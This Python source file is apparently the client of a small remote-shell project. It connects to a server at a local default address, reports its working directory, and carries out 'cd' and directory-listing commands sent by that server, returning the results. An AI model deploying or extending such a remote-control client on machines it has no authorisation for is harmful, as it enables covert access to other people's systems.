import socket
import sys
import os
import asyncio
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)

from crypto.aes_encryptor import AESEncryptor
from commands.crocodilec import crocodile

class AsyncClient:
    def __init__(self, host='127.0.0.1', port=65432):
        self.host = host
        self.port = port
        self.commands = crocodile()

    async def connect(self):
        reader, writer = await asyncio.open_connection(self.host, self.port)
        # if writer.transport.is_closing:
        #     current_dir = os.getcwd()
        #     res_dir = current_dir.encode("utf-8")
        #     print(res_dir)
        #     writer.write(res_dir)  
        #     data = await reader.read(1024)
        current_dir = os.getcwd()
        res_dir = current_dir.encode("utf-8")
        print(res_dir)
        writer.write(res_dir)  
        while True:
            try:
                data = await reader.read(1024)
                command = data.decode()
                print(f"Comando recibido: {command}")
                if command.startswith("cd "):
                    path = command[3:]
                    if os.path.exists(path) and os.path.isdir(path):
                        os.chdir(path)
                        current_dir = os.getcwd()     
                        writer.write(current_dir.encode('utf-8'))
                        await writer.drain()  # Enviar los datos
                        print(current_dir)
                elif command.startswith("ls") or command.startswith("dir"):
                        path = os.getcwd() 
                        dir_list = ""
                        p =  os.listdir(path) 
                        if p != []:               
                            for command in os.listdir(path):
                                if command != 0:
                                    dir_list += command + '\n'
                        else:
                            dir_list = "No Result."
                        writer.write(dir_list.encode('utf-8'))
                else:
                     writer.write(b"Comando incorrecto.")

            except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
                            print("Cliente desconectado de forma inesperada.")
                            break
            except Exception as e:
                print(f"Error en el shell: {e}")
                break  

if __name__ == "__main__":
    client = AsyncClient()
    asyncio.run(client.connect())
